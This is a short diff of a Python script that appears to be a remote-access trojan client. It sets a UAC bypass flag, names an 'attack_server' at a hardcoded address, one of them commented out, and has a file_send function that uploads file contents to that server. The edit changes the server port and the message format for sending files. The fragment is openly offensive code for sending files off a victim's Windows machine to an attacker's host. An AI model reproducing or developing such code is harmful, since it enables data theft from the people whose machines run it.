@@ -4,7 +4,7 @@ import win32com.shell.shell as shell
 
 DEBUG=True
 UAC_BYPASS=False
-port = 9001  #port of attack_server
+port = 9003  #port of attack_server
 host_addr = "127.0.0.1" 
 #host_addr = "175.192.214.36" #address of attack_server
 
@@ -44,7 +44,7 @@ def file_send(conn_param,file_path_param):
             file_content = f.read()
             file_name = file_path_param.split('\\')[-1]
             file_size = len(file_content)
-            send_s(conn_param,f'fileinfo {file_name} {file_size}')
+            send_s(conn_param,f'fileinfo:{file_name}:{file_size}')
             debug_print(f"file_info sended : fileinfo {file_name} {file_size}")
             conn_param.sendall(file_content)
             debug_print(f"file_content sended")
